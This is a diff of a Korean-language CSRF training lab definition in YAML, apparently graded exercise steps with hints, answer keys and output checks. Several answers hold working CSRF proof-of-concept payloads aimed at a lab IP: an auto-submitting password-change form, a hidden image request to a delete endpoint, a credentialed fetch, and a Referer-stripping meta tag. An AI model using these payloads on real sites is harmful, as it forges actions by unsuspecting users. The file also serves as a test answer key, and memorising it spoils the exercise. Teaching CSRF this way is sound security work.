@@ -13,11 +13,12 @@ objectives:
 pass_threshold: 0.6
 steps:
 - order: 1
-  instruction: 대상 애플리케이션(http://10.20.30.80)의 폼에서 CSRF 토큰 존재 여부를 확인하시오.
+  instruction: 대상 애플리케이션(http://{{WEB_IP}})의 폼에서 CSRF 토큰 존재 여부를 확인하시오.
   hint: HTML 소스에서 hidden input을 찾으세요.
   category: csrf_detect
   points: 8
-  answer: curl -s http://10.20.30.80 | grep -i 'csrf\|_token\|hidden' | head -10 && echo 'CSRF 토큰 확인 완료'
+  answer: curl -s http://10.20.30.80 | grep -i 'csrf\|_token\|hidden' | head -10 &&
+    echo 'CSRF 토큰 확인 완료'
   answer_detail: CSRF 토큰이 없으면 외부 사이트에서 요청을 위조할 수 있습니다.
   verify:
     type: output_contains
@@ -29,7 +30,9 @@ steps:
   hint: auto-submit 폼을 작성하세요.
   category: csrf_craft
   points: 10
-  answer: echo '<html><body onload="document.forms[0].submit()"><form action="http://10.20.30.80/profile" method="POST"><input name="password" value="hacked"></form></body></html>' && echo 'CSRF PoC 작성 완료'
+  answer: echo '<html><body onload="document.forms[0].submit()"><form action="http://10.20.30.80/profile"
+    method="POST"><input name="password" value="hacked"></form></body></html>' &&
+    echo 'CSRF PoC 작성 완료'
   answer_detail: 자동 제출 폼으로 사용자가 페이지를 방문하면 즉시 요청이 전송됩니다.
   verify:
     type: output_contains
@@ -41,7 +44,8 @@ steps:
   hint: img src에 상태 변경 URL을 삽입하세요.
   category: csrf_craft
   points: 10
-  answer: echo '<img src="http://10.20.30.80/api/users/1/delete" style="display:none">' && echo 'GET CSRF PoC 작성 완료'
+  answer: echo '<img src="http://10.20.30.80/api/users/1/delete" style="display:none">'
+    && echo 'GET CSRF PoC 작성 완료'
   answer_detail: GET 요청으로 상태 변경이 가능하면 img 태그만으로 CSRF가 가능합니다.
   verify:
     type: output_contains
@@ -53,7 +57,8 @@ steps:
   hint: 'fetch로 credentials: include 옵션을 사용하세요.'
   category: csrf_craft
   points: 10
-  answer: echo 'fetch(URL,{method:"POST",credentials:"include",body:JSON.stringify({email:"evil@test.com"})})' && echo 'AJAX CSRF 작성 완료'
+  answer: echo 'fetch(URL,{method:"POST",credentials:"include",body:JSON.stringify({email:"evil@test.com"})})'
+    && echo 'AJAX CSRF 작성 완료'
   answer_detail: 'credentials: include로 쿠키가 자동 첨부되어 인증된 요청을 위조합니다.'
   verify:
     type: output_contains
@@ -65,7 +70,8 @@ steps:
   hint: Set-Cookie 헤더에서 SameSite를 확인하세요.
   category: csrf_defense
   points: 10
-  answer: curl -sI http://10.20.30.80 | grep -i 'set-cookie' && echo 'SameSite 분석 완료'
+  answer: curl -sI http://10.20.30.80 | grep -i 'set-cookie' && echo 'SameSite 분석
+    완료'
   answer_detail: SameSite=Strict는 모든 크로스사이트 요청에서 쿠키 전송을 차단합니다.
   verify:
     type: output_contains
@@ -77,7 +83,8 @@ steps:
   hint: 토큰 재사용, 빈 토큰 등을 테스트하세요.
   category: csrf_bypass
   points: 12
-  answer: echo '=== CSRF 토큰 약점 ===' && echo '1. 토큰 미검증' && echo '2. 빈 토큰 허용' && echo '3. 토큰 재사용' && echo 'CSRF 토큰 분석 완료'
+  answer: echo '=== CSRF 토큰 약점 ===' && echo '1. 토큰 미검증' && echo '2. 빈 토큰 허용' && echo
+    '3. 토큰 재사용' && echo 'CSRF 토큰 분석 완료'
   answer_detail: CSRF 토큰 구현 오류로 방어가 무효화될 수 있습니다.
   verify:
     type: output_contains
@@ -89,7 +96,8 @@ steps:
   hint: Referer를 제거하는 기법을 사용하세요.
   category: csrf_bypass
   points: 10
-  answer: echo '<meta name="referrer" content="no-referrer">' && echo 'Referer 우회 기법 완료'
+  answer: echo '<meta name="referrer" content="no-referrer">' && echo 'Referer 우회
+    기법 완료'
   answer_detail: meta 태그로 Referer 전송을 방지하면 서버의 Referer 검증을 우회할 수 있습니다.
   verify:
     type: output_contains
@@ -101,7 +109,8 @@ steps:
   hint: Content-Type 제한을 확인하세요.
   category: csrf_advanced
   points: 10
-  answer: "curl -s -X POST http://10.20.30.80/api/test \\\n  -H 'Content-Type: text/plain' \\\n  -d '{\"test\":1}' 2>/dev/null && echo 'JSON CSRF 분석 완료'"
+  answer: "curl -s -X POST http://10.20.30.80/api/test \\\n  -H 'Content-Type: text/plain'\
+    \ \\\n  -d '{\"test\":1}' 2>/dev/null && echo 'JSON CSRF 분석 완료'"
   answer_detail: 서버가 Content-Type을 검증하지 않으면 text/plain으로 JSON 데이터를 전송할 수 있습니다.
   verify:
     type: output_contains
@@ -113,7 +122,8 @@ steps:
   hint: Access-Control 헤더를 확인하세요.
   category: csrf_advanced
   points: 10
-  answer: "curl -sI \\\n  -H 'Origin: http://evil.com' http://10.20.30.80 \\\n | grep -i 'access-control' && echo 'CORS 분석 완료' || echo 'CORS 미설정 확인 완료'"
+  answer: "curl -sI \\\n  -H 'Origin: http://evil.com' http://10.20.30.80 \\\n | grep\
+    \ -i 'access-control' && echo 'CORS 분석 완료' || echo 'CORS 미설정 확인 완료'"
   answer_detail: CORS 와일드카드(*)는 credentials와 함께 사용 불가하지만 특정 Origin 반사는 위험합니다.
   verify:
     type: output_contains
@@ -125,7 +135,8 @@ steps:
   hint: XSS로 CSRF 토큰을 탈취하는 시나리오를 구성하세요.
   category: csrf_advanced
   points: 10
-  answer: echo '=== XSS+CSRF 체인 ===' && echo '1. XSS로 CSRF 토큰 읽기' && echo '2. 탈취 토큰으로 CSRF 요청' && echo '3. 방어 우회 성공' && echo '체인 공격 설계 완료'
+  answer: echo '=== XSS+CSRF 체인 ===' && echo '1. XSS로 CSRF 토큰 읽기' && echo '2. 탈취 토큰으로
+    CSRF 요청' && echo '3. 방어 우회 성공' && echo '체인 공격 설계 완료'
   answer_detail: XSS가 존재하면 CSRF 토큰 방어가 무효화됩니다.
   verify:
     type: output_contains
@@ -137,7 +148,8 @@ steps:
   hint: 쿠키와 요청 파라미터의 토큰 비교를 설명하세요.
   category: csrf_defense
   points: 10
-  answer: echo '=== Double Submit Cookie ===' && echo '1. 서버가 랜덤 토큰을 쿠키로 설정' && echo '2. 클라이언트가 헤더에 복사' && echo '3. 서버가 일치 확인' && echo 'Double Submit 분석 완료'
+  answer: echo '=== Double Submit Cookie ===' && echo '1. 서버가 랜덤 토큰을 쿠키로 설정' && echo
+    '2. 클라이언트가 헤더에 복사' && echo '3. 서버가 일치 확인' && echo 'Double Submit 분석 완료'
   answer_detail: 크로스사이트에서는 쿠키 값을 읽을 수 없으므로 헤더에 복사할 수 없습니다.
   verify:
     type: output_contains
@@ -149,7 +161,8 @@ steps:
   hint: Django, Spring, Express 등의 CSRF 방어를 정리하세요.
   category: csrf_defense
   points: 10
-  answer: 'echo ''=== 프레임워크 CSRF 방어 ==='' && echo ''Django: csrf_token'' && echo ''Spring: CsrfFilter'' && echo ''Express: csurf'' && echo ''프레임워크 비교 완료'''
+  answer: 'echo ''=== 프레임워크 CSRF 방어 ==='' && echo ''Django: csrf_token'' && echo ''Spring:
+    CsrfFilter'' && echo ''Express: csurf'' && echo ''프레임워크 비교 완료'''
   answer_detail: 대부분의 현대 프레임워크는 CSRF 방어를 내장하고 있습니다.
   verify:
     type: output_contains
@@ -173,7 +186,8 @@ steps:
   hint: 토큰, SameSite, Referer 검증 등을 포함하세요.
   category: csrf_defense
   points: 12
-  answer: echo '=== CSRF 방어 권고 ===' && echo '1. CSRF 토큰 적용' && echo '2. SameSite=Strict' && echo '3. Referer 검증' && echo '4. CORS 제한' && echo 'CSRF 방어 정리 완료'
+  answer: echo '=== CSRF 방어 권고 ===' && echo '1. CSRF 토큰 적용' && echo '2. SameSite=Strict'
+    && echo '3. Referer 검증' && echo '4. CORS 제한' && echo 'CSRF 방어 정리 완료'
   answer_detail: 다층 CSRF 방어가 필요합니다.
   verify:
     type: output_contains
@@ -185,7 +199,9 @@ steps:
   hint: 발견 취약점, PoC, 방어 권고를 포함하세요.
   category: verification
   points: 8
-  answer: 'echo ''=== CSRF 분석 보고서 ==='' && echo ''대상: http://10.20.30.80'' && echo ''발견: CSRF 토큰 미적용'' && echo ''영향: 설정/패스워드 변경'' && echo ''조치: 토큰 + SameSite'' && echo ''=== 보고서 완료 ==='''
+  answer: 'echo ''=== CSRF 분석 보고서 ==='' && echo ''대상: http://10.20.30.80'' && echo
+    ''발견: CSRF 토큰 미적용'' && echo ''영향: 설정/패스워드 변경'' && echo ''조치: 토큰 + SameSite'' &&
+    echo ''=== 보고서 완료 ==='''
   answer_detail: CSRF 보고서는 PoC와 재현 절차를 반드시 포함해야 합니다.
   verify:
     type: output_contains
